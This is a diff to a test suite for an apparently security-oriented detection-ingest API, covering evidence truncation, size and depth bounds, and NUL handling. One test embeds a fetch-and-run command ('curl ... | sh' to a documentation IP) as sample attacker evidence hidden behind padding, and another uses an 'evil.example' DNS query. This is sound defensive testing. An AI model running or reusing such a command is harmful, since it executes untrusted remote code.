@@ -13,11 +13,15 @@ vi.mock("@/lib/prisma", () => ({ prisma: db }));
 
 import { POST } from "@/app/api/ingest/detection/route";
 import {
+  MAX_BODY_DEPTH,
   MAX_EVENTS,
   MAX_EVENT_ARRAY_ITEMS,
   MAX_EVENT_DEPTH,
+  MAX_EVENT_KEYS,
+  MAX_EVENT_KEY_BYTES,
   MAX_EVENT_STRING_BYTES,
   MAX_TITLE_BYTES,
+  cutUtf8HeadTail,
   truncateUtf8,
 } from "@/lib/detection-payload";
 
@@ -230,8 +234,8 @@ describe("POST /api/ingest/detection", () => {
       expect((await post(structured({ title }))).status).toBe(200);
       const kept: string = stored().title;
       expect(kept.startsWith("T1059 cmdline=AAAA")).toBe(true);
-      expect(kept.endsWith(`… [truncated, ${title.length} bytes]`)).toBe(true);
-      expect(Buffer.byteLength(kept)).toBeLessThan(MAX_TITLE_BYTES + 64);
+      expect(kept).toContain(` … [truncated, ${title.length} bytes] … `);
+      expect(Buffer.byteLength(kept)).toBeLessThanOrEqual(MAX_TITLE_BYTES);
     });
 
     it("keeps a correlator case id cut at its bound, for an image named to the NTFS limit", async () => {
@@ -245,14 +249,16 @@ describe("POST /api/ingest/detection", () => {
       const padded = `12345:${"x".repeat(5000)}`;
       expect((await post(structured({ source: { engine: "correlator", case_id: padded } }))).status).toBe(200);
       expect(stored().case_id).toMatch(/^12345:x+… \[truncated, 5006 bytes\]$/);
+      expect(Buffer.byteLength(stored().case_id)).toBeLessThanOrEqual(1024);
     });
 
     it("refuses a key reused for a different title that cuts to the same stored one", async () => {
-      // Same length, same head, different tail past the cut: both store the same title, so only a
-      // hash of the body as sent tells a retry from different evidence.
+      // Same length, same head and tail, different middle cut out: both store the same title, so
+      // only a hash of the body as sent tells a retry from different evidence.
       const head = `T1059 cmdline=${"A".repeat(MAX_TITLE_BYTES)}`;
-      const first = structured({ title: `${head}-first` });
-      const other = structured({ title: `${head}-other` });
+      const tail = "Z".repeat(MAX_TITLE_BYTES);
+      const first = structured({ title: `${head}-first-${tail}` });
+      const other = structured({ title: `${head}-other-${tail}` });
       const key = { "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" };
       expect((await post(first, key)).status).toBe(200);
       const { ingestPayloadHash, meta } = db.detection.create.mock.calls[0][0].data;
@@ -273,10 +279,10 @@ describe("POST /api/ingest/detection", () => {
       expect((await post(structured({ events: [exec] }))).status).toBe(200);
       const { event, meta } = db.detection.create.mock.calls[0][0].data;
       expect(event.cmdline.startsWith("sh -c \u0001")).toBe(true);
-      expect(event.cmdline).toMatch(/… \[truncated, \d+ bytes\]$/);
-      expect(Buffer.byteLength(event.cmdline)).toBeLessThan(MAX_EVENT_STRING_BYTES + 64);
+      expect(event.cmdline).toMatch(/ … \[truncated, \d+ bytes\] … /);
+      expect(Buffer.byteLength(event.cmdline)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
       expect(event.argv.slice(0, 2)).toEqual(["sh", "-c"]);
-      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 2, cutArrays: 0 });
+      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 2, cutArrays: 0, nulStrings: 0 });
     });
 
     it("keeps the trigger and the first evidence when a detection carries more events than any rule emits", async () => {
@@ -285,7 +291,7 @@ describe("POST /api/ingest/detection", () => {
       const { event, meta } = db.detection.create.mock.calls[0][0].data;
       expect(event.n).toBe(0);
       expect(meta.additional_events).toHaveLength(MAX_EVENTS - 1);
-      expect(meta.events_cut).toEqual({ droppedEvents: 50, cutStrings: 0, cutArrays: 0 });
+      expect(meta.events_cut).toEqual({ droppedEvents: 50, cutStrings: 0, cutArrays: 0, nulStrings: 0 });
     });
 
     it("keeps a ransomware damage manifest whole: 101 events is within the bound", async () => {
@@ -301,7 +307,7 @@ describe("POST /api/ingest/detection", () => {
       expect((await post(structured({ events: [{ type: "exec", argv }] }))).status).toBe(200);
       const { event, meta } = db.detection.create.mock.calls[0][0].data;
       expect(event.argv).toHaveLength(MAX_EVENT_ARRAY_ITEMS);
-      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 0, cutArrays: 1 });
+      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 0, cutArrays: 1, nulStrings: 0 });
     });
 
     it("refuses an event nested deeper than any schema event, which no monitored process can cause", async () => {
@@ -321,15 +327,225 @@ describe("POST /api/ingest/detection", () => {
       });
       expect(response.status).toBe(200);
       const { event, meta } = db.detection.create.mock.calls[0][0].data;
-      expect(event.cmdline).toMatch(/… \[truncated, \d+ bytes\]$/);
-      expect(meta).toEqual({ hostname: "host-a", events_cut: { droppedEvents: 0, cutStrings: 1, cutArrays: 0 } });
+      expect(event.cmdline).toMatch(/ … \[truncated, \d+ bytes\] … /);
+      expect(meta).toEqual({
+        hostname: "host-a",
+        events_cut: { droppedEvents: 0, cutStrings: 1, cutArrays: 0, nulStrings: 0 },
+      });
     });
 
     it("never splits a character when it cuts", () => {
-      // "é" is two bytes, "😀" four: a cut at 5 bytes lands inside one of them.
-      expect(truncateUtf8("éé😀", 5)).toBe("éé… [truncated, 8 bytes]");
-      expect(truncateUtf8("ééé", 5)).toBe("éé… [truncated, 6 bytes]");
+      // "é" is two bytes, "😀" four: a head of 5 bytes lands inside one of them.
+      const marker = (n: number) => `… [truncated, ${n} bytes]`;
+      const room = (n: number) => 5 + Buffer.byteLength(marker(n));
+      const pad = "x".repeat(40);
+      expect(truncateUtf8(`éé😀${pad}`, room(48))).toBe(`éé${marker(48)}`);
+      expect(truncateUtf8(`ééé${pad}`, room(46))).toBe(`éé${marker(46)}`);
       expect(truncateUtf8("short", 5)).toBe("short");
+
+      // Head and tail: 5 + 5 bytes around the marker, both cuts inside a character.
+      const middle = (n: number) => ` … [truncated, ${n} bytes] … `;
+      const value = `😀é${pad}😀é`;
+      const bytes = Buffer.byteLength(value);
+      const cut = cutUtf8HeadTail(value, 10 + Buffer.byteLength(middle(bytes)));
+      // The head backs off to 4 bytes; the tail moves forward past the 😀 it starts inside.
+      expect(cut).toBe(`😀${middle(bytes)}é`);
+      expect(cut).not.toContain("�");
+    });
+
+    it("keeps the payload a process places after its padding, in a string, an argv and the title", async () => {
+      const payload = "curl http://203.0.113.7/x | sh";
+      const cmdline = `bash -c '${" ".repeat(70 * 1024)}; ${payload}'`;
+      const argv = [...Array.from({ length: MAX_EVENT_ARRAY_ITEMS + 5 }, () => ""), payload];
+      const title = `T1059 cmdline=${cmdline}`;
+      expect((await post(structured({ title, events: [{ type: "exec", cmdline, argv }] }))).status).toBe(200);
+      const { event, meta } = db.detection.create.mock.calls[0][0].data;
+      expect(event.cmdline.startsWith("bash -c '")).toBe(true);
+      expect(event.cmdline.endsWith(`; ${payload}'`)).toBe(true);
+      expect(event.argv).toHaveLength(MAX_EVENT_ARRAY_ITEMS);
+      expect(event.argv.at(-1)).toBe(payload);
+      expect(meta.title.startsWith("T1059 cmdline=bash")).toBe(true);
+      expect(meta.title.endsWith(`; ${payload}'`)).toBe(true);
+    });
+
+    it("keeps exactly MAX_EVENTS events and cuts the next one", async () => {
+      const events = (n: number) => Array.from({ length: n }, (_, i) => ({ type: "file_rename", n: i }));
+      expect((await post(structured({ events: events(MAX_EVENTS) }))).status).toBe(200);
+      expect(stored().additional_events).toHaveLength(MAX_EVENTS - 1);
+      expect(stored().events_cut).toBeUndefined();
+
+      vi.clearAllMocks();
+      db.detection.create.mockResolvedValue({ id: "detection-db" });
+      expect((await post(structured({ events: events(MAX_EVENTS + 1) }))).status).toBe(200);
+      expect(stored().additional_events).toHaveLength(MAX_EVENTS - 1);
+      expect(stored().events_cut.droppedEvents).toBe(1);
+    });
+
+    it("keeps a string exactly at its bound and cuts one byte more", async () => {
+      const exact = "A".repeat(MAX_EVENT_STRING_BYTES);
+      expect((await post(structured({ events: [{ type: "exec", cmdline: exact }] }))).status).toBe(200);
+      expect(db.detection.create.mock.calls[0][0].data.event.cmdline).toBe(exact);
+      expect(stored().events_cut).toBeUndefined();
+
+      vi.clearAllMocks();
+      db.detection.create.mockResolvedValue({ id: "detection-db" });
+      expect((await post(structured({ events: [{ type: "exec", cmdline: `${exact}B` }] }))).status).toBe(200);
+      const kept: string = db.detection.create.mock.calls[0][0].data.event.cmdline;
+      expect(Buffer.byteLength(kept)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
+      expect(kept.endsWith("AB")).toBe(true);
+      expect(stored().events_cut.cutStrings).toBe(1);
+    });
+
+    it("keeps an array exactly at its bound and cuts one item more, head and tail kept", async () => {
+      const argv = Array.from({ length: MAX_EVENT_ARRAY_ITEMS }, (_, i) => String(i));
+      expect((await post(structured({ events: [{ type: "exec", argv }] }))).status).toBe(200);
+      expect(db.detection.create.mock.calls[0][0].data.event.argv).toEqual(argv);
+      expect(stored().events_cut).toBeUndefined();
+
+      vi.clearAllMocks();
+      db.detection.create.mockResolvedValue({ id: "detection-db" });
+      expect((await post(structured({ events: [{ type: "exec", argv: [...argv, "last"] }] }))).status).toBe(200);
+      const kept: string[] = db.detection.create.mock.calls[0][0].data.event.argv;
+      expect(kept).toHaveLength(MAX_EVENT_ARRAY_ITEMS);
+      expect(kept[0]).toBe("0");
+      expect(kept.at(-1)).toBe("last");
+      expect(stored().events_cut.cutArrays).toBe(1);
+    });
+
+    it("accepts an event nested exactly MAX_EVENT_DEPTH levels deep", async () => {
+      // The event object is level 1; each wrapper adds one.
+      let deep: Record<string, unknown> = { leaf: 1 };
+      for (let i = 1; i < MAX_EVENT_DEPTH; i++) deep = { deep };
+      expect((await post(structured({ events: [deep] }))).status).toBe(200);
+    });
+
+    it("cuts a non-ASCII string through the route without splitting a character", async () => {
+      const cmdline = "é".repeat(MAX_EVENT_STRING_BYTES) + "😀".repeat(1000);
+      expect((await post(structured({ events: [{ type: "exec", cmdline }] }))).status).toBe(200);
+      const kept: string = db.detection.create.mock.calls[0][0].data.event.cmdline;
+      expect(kept.startsWith("éé")).toBe(true);
+      expect(kept.endsWith("😀😀")).toBe(true);
+      expect(kept).not.toContain("�");
+      expect(Buffer.byteLength(kept)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
+    });
+
+    it("accepts a keyed retry of a cut detection: the hash is of the body as sent, before the cut", async () => {
+      const body = structured({ events: [{ type: "exec", cmdline: "A".repeat(2 * MAX_EVENT_STRING_BYTES) }] });
+      const key = { "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" };
+      expect((await post(body, key)).status).toBe(200);
+      const { ingestPayloadHash } = db.detection.create.mock.calls[0][0].data;
+      expect(ingestPayloadHash).toBe(createHash("sha256").update(JSON.stringify(body)).digest("hex"));
+
+      db.detection.create.mockRejectedValueOnce({ code: "P2002" });
+      db.detection.findUnique.mockResolvedValueOnce({ ingestPayloadHash });
+      expect((await post(body, key)).status).toBe(200);
+    });
+
+    it("refuses an event key longer than any schema field name, and accepts one at the bound", async () => {
+      const at = "k".repeat(MAX_EVENT_KEY_BYTES);
+      expect((await post(structured({ events: [{ type: "exec", [at]: 1 }] }))).status).toBe(200);
+      vi.clearAllMocks();
+      db.detection.create.mockResolvedValue({ id: "detection-db" });
+      expect((await post(structured({ events: [{ type: "exec", [`${at}k`]: 1 }] }))).status).toBe(400);
+      const huge = { type: "exec", nested: { ["k".repeat(5_000_000)]: 1 } };
+      expect((await post(structured({ events: [huge] }))).status).toBe(400);
+      expect(db.detection.create).not.toHaveBeenCalled();
+    });
+
+    it("refuses an object with more keys than any schema event, and accepts one at the bound", async () => {
+      const keys = (n: number) => Object.fromEntries(Array.from({ length: n }, (_, i) => [`k${i}`, i]));
+      expect((await post(structured({ events: [keys(MAX_EVENT_KEYS)] }))).status).toBe(200);
+      vi.clearAllMocks();
+      db.detection.create.mockResolvedValue({ id: "detection-db" });
+      expect((await post(structured({ events: [keys(MAX_EVENT_KEYS + 1)] }))).status).toBe(400);
+      expect((await post(structured({ events: [{ type: "exec", env: keys(300_000) }] }))).status).toBe(400);
+      expect(db.detection.create).not.toHaveBeenCalled();
+    });
+
+    it("refuses a body nested past what JSON.stringify can hash with a 400, not a 500", async () => {
+      const nested = (levels: number) => {
+        let deep: unknown = 1;
+        for (let i = 0; i < levels; i++) deep = [deep];
+        return deep;
+      };
+      // 20,000 levels in an unknown key, which zod strips: past the ~10,000 at which the route's
+      // JSON.stringify of the raw body throws. Built as text, since stringifying it here would too.
+      const deepBody = `{"timestamp_ns":1,"severity":"low","title":"t",`
+        + `"source":{"engine":"rule","rule_id":"r"},"events":[],`
+        + `"unknown":${"[".repeat(20_000)}1${"]".repeat(20_000)}}`;
+      const response = await POST(new NextRequest("http://localhost/api/ingest/detection", {
+        method: "POST",
+        headers: { ...headers, "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" },
+        body: deepBody,
+      }));
+      expect(response.status).toBe(400);
+      // The body is level 1 and the innermost array holds a number, so `levels` arrays reach
+      // level `levels + 1`.
+      expect((await post({ ...structured({}), unknown: nested(MAX_BODY_DEPTH) })).status).toBe(400);
+      expect((await post({ ...structured({}), unknown: nested(MAX_BODY_DEPTH - 1) })).status).toBe(200);
+      expect(db.detection.create).toHaveBeenCalledTimes(1);
+    });
+
+    it("bounds the legacy meta like an event", async () => {
+      const legacy = (meta: Record<string, unknown>) => ({
+        timestamp_ns: 1_700_000_000_000_000_000,
+        technique: "T1059",
+        severity: "medium",
+        event: { type: "exec" },
+        meta,
+      });
+      expect((await post(legacy({ hostname: "host-a", note: "N".repeat(2 * MAX_EVENT_STRING_BYTES) }))).status).toBe(200);
+      const { meta } = db.detection.create.mock.calls[0][0].data;
+      expect(meta.hostname).toBe("host-a");
+      expect(Buffer.byteLength(meta.note)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
+      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 1, cutArrays: 0, nulStrings: 0 });
+
+      vi.clearAllMocks();
+      db.detection.create.mockResolvedValue({ id: "detection-db" });
+      expect((await post(legacy({ ["k".repeat(MAX_EVENT_KEY_BYTES + 1)]: 1 }))).status).toBe(400);
+      expect(db.detection.create).not.toHaveBeenCalled();
+    });
+
+    it("replaces a NUL, which jsonb cannot store, instead of failing the insert", async () => {
+      const response = await post(structured({
+        title: "T1059 name=a\u0000b",
+        events: [{ type: "dns_query", query: "evil\u0000.example" }],
+      }));
+      expect(response.status).toBe(200);
+      const { event, meta } = db.detection.create.mock.calls[0][0].data;
+      expect(event.query).toBe("evil�.example");
+      expect(meta.title).toBe("T1059 name=a�b");
+      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 0, cutArrays: 0, nulStrings: 1 });
+    });
+
+    it("marks a detection the agent already shortened, though it arrives under every bound", async () => {
+      const title = "[events shortened from 21600826 bytes] pid=15271 comm=python3: base64 decode";
+      expect((await post(structured({ title, events: [{ type: "exec" }] }))).status).toBe(200);
+      expect(stored().events_cut).toEqual({
+        droppedEvents: 0, cutStrings: 0, cutArrays: 0, nulStrings: 0, agentShortenedFromBytes: 21600826,
+      });
+    });
+
+    it("logs which agent's evidence was cut, with counts and no payload", async () => {
+      const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const padded = "S".repeat(2 * MAX_EVENT_STRING_BYTES);
+      expect((await post(structured({ events: [{ type: "exec", cmdline: padded }] }))).status).toBe(200);
+      expect(warn).toHaveBeenCalledTimes(1);
+      const line = warn.mock.calls[0].join(" ");
+      expect(line).toContain('"agentId":"agent-db"');
+      expect(line).toContain('"cutStrings":1');
+      expect(line).not.toContain("SSSS");
+      warn.mockClear();
+      expect((await post(structured({ events: [{ type: "exec", cmdline: "ls" }] }))).status).toBe(200);
+      expect(warn).not.toHaveBeenCalled();
+      warn.mockRestore();
+    });
+
+    it("mirrors MAX_EVENTS in the agent's SERVER_MAX_EVENTS, which bounds the damage manifest", () => {
+      const sink = readFileSync(path.resolve(__dirname, "../../../agent/src/sink.rs"), "utf8");
+      const mirrored = /const SERVER_MAX_EVENTS: usize = (\d+);/.exec(sink);
+      expect(mirrored, "SERVER_MAX_EVENTS in agent/src/sink.rs").not.toBeNull();
+      expect(Number(mirrored?.[1])).toBe(MAX_EVENTS);
     });
 
     it("refuses an oversized identifier that comes from shipped content", async () => {
